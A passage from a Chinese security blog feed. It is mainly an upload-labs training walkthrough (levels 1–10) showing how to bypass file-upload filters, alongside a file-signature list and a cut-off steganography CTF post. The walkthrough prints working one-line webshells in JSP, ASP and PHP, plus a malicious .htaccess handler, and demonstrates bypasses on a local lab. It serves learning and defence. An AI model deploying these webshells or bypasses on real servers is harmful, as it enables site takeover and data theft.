src="http://img-blog.csdnimg.cn/20190814134830601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190814134822821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试成功。<br><img src="http://img-blog.csdnimg.cn/20190814131818623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好了，到这暂时就结束了至于Less20，需要审计代码，目前自己还做不了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞 upload-labs 练习（一）</title>
      <link href="2019/08/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/08/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Less 1—10 写的很详细！╰(￣ω￣ｏ)</p><p>这周学习下关于文件上传漏洞的知识（小白入门），使用的平台是 <strong>upload-labs-master</strong> 项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br><img src="http://img-blog.csdnimg.cn/20190804162846978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先来介绍下文件上传漏洞<br><strong>一. 什么是文件上传漏洞</strong></p><blockquote><p>Web应用程序通常会有文件上传的功能, 例如在 BBS发布图片 , 在个人网站发布ZIP 压缩 包, 在办公平台发布DOC文件等 , 只要 Web应用程序允许上传文件, 就有可能存在文件上传漏洞</p></blockquote><p><strong>二.什么样的网站会有文件上传漏洞</strong></p><blockquote><p>大部分文件上传漏洞的产生是因为Web应用程序没有对上传文件的格式进行严格过滤 , 还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护, 后面我们会讲 到一些常见的解析漏洞, 最后还有一些不常见的其他漏洞, 如 IIS PUT漏洞等 </p></blockquote><p><strong>三.文件上传漏洞的危害</strong></p><blockquote><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞 , 攻击者甚至可以直接上传一个webshell到服务器上<br> <hr></p></blockquote><p>关于<strong>webshell</strong></p><blockquote><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p></blockquote><p><strong>webshell</strong>的分类</p><blockquote><p>1.根据文件大小分类：大马和小马(通常指的是一句话木马，能够使用菜刀这类工具去直接连接它)<br> 2.根据脚本名称分类：jsp、asp、aspx、php</p></blockquote><p>几种经典的<strong>webshell:</strong></p><p>1）jsp的简单的webshell:</p><pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></pre><p>2）asp的简单的webshell:</p><pre><code>success!!!!&lt;%eval request(&quot;cmd&quot;)%&gt;</code></pre><p>3）php的简单的webshell:</p><ul><li><p> php经典一句话: <code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></p></li><li><p>中国菜刀：<code>&lt;?php @eval($_POST[&#39;自定义密码&#39;]);?&gt; 然后连接菜刀就能直接进服务器了</code></p><p>好了介绍完这些就开始做题吧(。・∀・)ノ,<hr></p></li></ul><p><strong>Less-1</strong><br><img src="http://img-blog.csdnimg.cn/2019080418580531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 先在本地新建一个webshell文件，然后上传webshell 发现失败<br><img src="http://img-blog.csdnimg.cn/20190804190905864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码发现是JS验证，只能上传<code>.jpg|.png|.gif</code>这三种文件格式<br><img src="http://img-blog.csdnimg.cn/20190804191122183.png" alt="在这里插入图片描述"><br>对于js验证有三种绕过方法：</p><ol><li><p>使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell</p></li><li><p>首先把webshell的后缀改成允许上传的.jpg|.png|.gif，绕过JS检测。再抓包把后缀名改成.php,即可上传webshell</p></li><li><p>在前端js判断函数中加上可以上传php文件,或者直接删去这一函数</p></li></ol><p>由于是第一题，这里就分别用两种方法绕过演示下  (*￣3￣)╭</p><p>先用第2种：<br>把webshell的后缀php改为png<br><img src="http://img-blog.csdnimg.cn/20190804215416297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后上传，抓包修改后缀为php， 然后forward发包<br><img src="http://img-blog.csdnimg.cn/20190804215259931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传文件url地址可以在这看到（蓝色选中部分），<br><img src="https://img-blog.csdnimg.cn/2019080422320517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>菜刀连接 地址：<code>http://127.0.0.1/upload-labs-master/upload/webshell.php</code><br><img src="http://img-blog.csdnimg.cn/20190804231308328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功（￣︶￣）↗　<br><img src="http://img-blog.csdnimg.cn/2019080422360040.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来看看第三种绕过：</p><p>这时要先猜测判断文件后缀的代码是在前端还是后端，打开burp进行拦截，发现点击上传后，并没有进行发包。可知判断后缀的代码在前端，即用js代码判断的，打开浏览器的审查元素，找到文件上传的js代码<br><img src="http://img-blog.csdnimg.cn/20190804224609581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到蓝色选中区有<code>checkFile()</code>函数，我们把它删除后再上传</p><p>然后同理在F12审查元素中找到路径，菜刀连接。</p><p>第一关结束！（提示：上传到upload文件夹的小马别忘删了，因为下面还要用）</p><p><strong>Less-2</strong></p><p>直接上传，失败，提示文件类型不正确<br><img src="http://img-blog.csdnimg.cn/20190805154127899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传图片发现可以成功<br><img src="http://img-blog.csdnimg.cn/20190805155600556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;文件类型不正确，请重新上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>发现这里采用的是后端验证文件类型, 但是他只过滤的文件类型, 并没有过滤文件后缀名, 所以可以上传 php文件，然后修改 content-type 绕过。<br>（可能会有小伙伴问，文件后缀名不就定义了我文件类型了吗，嗯…其实并不是，文件后缀只是决定了双击打开的方式，比如你用photoshop可以打开一个psd图像文件。把这个文件扩展名改为txt，再拖到photoshop窗口里，还是一样能打开，说明内容完全没有变化，变化的只是双击时的默认打开方式。）</p><p>可以看到这题的提示：<br><img src="http://img-blog.csdnimg.cn/20190805160817285.png" alt="在这里插入图片描述"><br>关于MIME我这里要说一下（百度百科<strong>是错的</strong>哦）：</p><blockquote><ul><li>它全名叫多用途互联网邮件扩展（Multipurpose Internet MailExtensions），最初是为了将纯文本格式的电子邮件扩展到可以支持多种信息格式而定制的。后来被应用到多种协议里，包括我们常用的HTTP协议。</li><li><strong>MIME的常见形式是一个主类型加一个子类型，用斜线分隔。比如text/html、application/javascript、image/png等</strong>。</li><li>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。</li></ul></blockquote><p>这里采用的判断方式就是MIME后端验证！<br>这里有两种绕过方法：↓</p><blockquote><p>PS：</p><ul><li>上传php文件时，Content-Type的值是application/octet-stream；</li><li>上传jpg文件时，Content-Type的值是image/jpeg</li></ul></blockquote><ol><li><p>如果服务器通过Content-Type的值判断文件类型，直接上传php文件(webshell)，抓包，将Content-Type的值修改为image/jpeg，即可上传php文件(webshell)。<br><img src="http://img-blog.csdnimg.cn/20190805170542903.jpg" alt="在这里插入图片描述"></p></li><li><p>先上传修改后缀名的webshell（webshell.php改为websshell.jpg）进行、抓包修改，后缀名改为webshell.php<br><img src="http://img-blog.csdnimg.cn/20190805170131135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后菜刀连接就行了<code>~(￣▽￣)~*</code></p></li></ol><p><strong>Less-3</strong></p><p>第三题又是一个新类型的题：<strong>黑名单限制文件上传</strong>，不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。那么要如何绕过呢？<br>这里说下关于Apache的一些知识：</p><ul><li>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</li><li>可以上传例如<code>php3, phtml</code>后缀的文件绕过，前提是<strong>Apache</strong>的<strong>httpd.conf</strong>中配置有如下代码:<br><code>AddType application/x-httpd-php .php .php3 .phtml</code></li></ul><p>服务器会将<code>.php3, .phtml</code>后缀的文件当成<code>.php</code>解析。</p><p>步骤：<br>先找到<strong>Apache</strong>下的<strong>httpd.conf</strong>文件，然后查找“AddType text/html”，然后在这行代码后面，加上一行<code>AddType application/x-httpd-php .php .php3 .phtml</code>即可<br><img src="http://img-blog.csdnimg.cn/20190805234419319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接上传后缀名为<code>.phtml</code>的webshell文件，注意这里上传的文件名会改变<br><img src="http://img-blog.csdnimg.cn/20190805234628997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接菜刀<br><img src="http://img-blog.csdnimg.cn/20190805234742624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功（￣︶￣）↗　<br><img src="http://img-blog.csdnimg.cn/20190805235002925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下一题<br><strong>Less-4</strong><br>同样是黑名单过滤，直接看源码吧：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件不允许上传!&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>这题很绝，基本上把那些花里胡哨的后缀都过滤了，但是没有包括<code>.htaccess</code>，可以利用配合Apache的<code>.htaccess</code>文件上传 解析漏洞。</p><blockquote><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。</p></blockquote><p>　<strong>启用<code>.htaccess</code>**：<br>　需要修改<code>httpd.conf</code>文件下的配置，查找关键词<code>AllowOverride</code>，将后面的</strong>None<strong>改成</strong>All**<br><img src="http://img-blog.csdnimg.cn/20190806180051350.png" alt="在这里插入图片描述"></p><p>然后，上传一个<code>.htaccess</code>内容如下的文件（抓包时删去文件名）:</p><pre><code>SetHandler application/x-httpd-php</code></pre><p><img src="http://img-blog.csdnimg.cn/20190806180857300.png" alt="在这里插入图片描述"><br>这样所有文件都会解析为php，然后再上传图片马（我的菜刀好像有问题，就上传图片马吧），就可以解析：</p><p>图片马语句：<code>&lt;?php phpinfo(); ?&gt;</code><br><img src="http://img-blog.csdnimg.cn/2019080618233148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析，下一关</p><p><strong>Less-5</strong></p><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用<strong>大小写绕过</strong>。<br>上传文件<code>webshell.Php</code>，<br><img src="http://img-blog.csdnimg.cn/20190806184907184.png" alt="在这里插入图片描述"><br>上传成功。可以发现文件名又改变了，连接菜刀时要注意哦<br><img src="http://img-blog.csdnimg.cn/2019080619020413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功</p><p><strong>Less-6</strong><br>查看源码发现还是黑名单，但是这关没有对后缀名进行去空格处理，可在后缀名中加空格绕过</p><pre><code> if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></pre><p>上传的<code>.php</code>文件 抓包加上空格就行了。<br><img src="http://img-blog.csdnimg.cn/20190808150945133.png" alt="在这里插入图片描述"><br>上传成功，查看文件命及路径<br><img src="https://img-blog.csdnimg.cn/20190808151244363.png" alt="在这里插入图片描述"><br>菜刀连接，成功。</p><p><strong>Less-7</strong><br>还是黑名单，但是没有对后缀名进行去<code>.</code>处理，，可在后缀名中加<code>.</code>绕过  ；上传后windows下会自动去掉后缀名中最后的<code>.</code><br><img src="http://img-blog.csdnimg.cn/20190808153824918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>菜刀连接，成功。</p><p><strong>Less-8</strong><br> 黑名单绕过，对比Less-4可以发现Less8少了这一句；<br><img src="http://img-blog.csdnimg.cn/20190808165531516.png" alt="在这里插入图片描述"><br>在php+windows的情况下：如果文件名+<code>::$DATA</code>,<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名 且保持”<code>::$DATA</code>“之前的文件名。（原因的话不清楚）<br>所以这题的绕过方法为：在文件后缀加<code>::$DATA</code><br>抓包，加上后缀就行了。<br><img src="http://img-blog.csdnimg.cn/20190808165952354.png" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-9</strong></p><p>我们先来看下Less2的路径拼接代码：</p><pre><code>   if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                    $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                    $is_upload = true;</code></pre><p>再看这一关的代码拼接，</p><pre><code>  if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name;                $is_upload = true;            &#125;</code></pre><p>发现5，6，7，8，9关都是一样，路径拼接的是处理后的文件名，导致可以利用类似<code>.php. .</code>(两个点号之间有一个空格)绕过<br>程序先是删除一个点，再删除一个空格经过处理后，文件名变成<code>.php.</code>，即可绕过。<br><img src="http://img-blog.csdnimg.cn/2019080818171377.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190808181823973.png" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-10</strong><br>依旧是黑名单过滤，查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>注意到，这里是将文件后缀名替换为空，于是可以利用双写绕过(不懂的话，百度下<code>str_ireplace</code>这个函数)：</p><pre><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190808190553694.png" alt="在这里插入图片描述"><br>成功上传。<br><img src="http://img-blog.csdnimg.cn/20190808190700260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr>这次就先总结到这吧，一次不想写太长，后面会补上；觉的我总结的还行的话 求关注呦╰(￣ω￣ｏ)]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的16进制文件头</title>
      <link href="2019/08/02/%E5%B8%B8%E8%A7%81%E7%9A%8416%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
      <url>2019/08/02/%E5%B8%B8%E8%A7%81%E7%9A%8416%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<p>PNG (png)，文件头：89504E47<br>JPEG (jpg)，文件头：FFD8FF<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku 杂项（三）</title>
      <link href="2019/08/01/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2019/08/01/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>1、旋转跳跃<br>2、论剑<br>3、图穷匕见</p><a id="more"></a><p>这周接着扳bugku上的题，话说暑假真的好无聊啊╯︿╰，希望赶紧开学。。。<hr><br><strong>1、旋转跳跃</strong><br><img src="http://img-blog.csdnimg.cn/20190730164612158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题没啥难度，就是考会不会用<strong>MP3Stego</strong>这个工具；放个福利吧，为了让更多的小白免受找工具之苦 下载地址：<a href="http://www.petitcolas.net/fabien/software/">http://www.petitcolas.net/fabien/software/</a><br><strong>常用命令：</strong></p><blockquote><p>加密：-X -P 123456 test.mp3  （123456 是密码，test.mp3待解密文件）<br> 加密：-E hidden.txt  -P 123456 test.mp3 （ hidden.txt 是隐藏文档，123456是密码 test.mp3待加密文件）</p></blockquote><p>开始做题，这题已经给了提示密文：<code>syclovergeek</code> 等会解密会用到，先把这题要分析的文件放进<code>MP3Stego</code>文件目录下，可以在<code>MP3Stego</code>的目录下打开Powershell窗口（ps：这里我在<code>MP3Stego</code>的目录下直接<code>get base here</code> 显示无法找到文件，不知道为啥）<br><img src="http://img-blog.csdnimg.cn/2019073018001427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接把<code>decode.exe</code>文件拖进黑框界面里 然后输入 <code>-X -P 密码 文件名</code><br><img src="http://img-blog.csdnimg.cn/20190730180141177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" 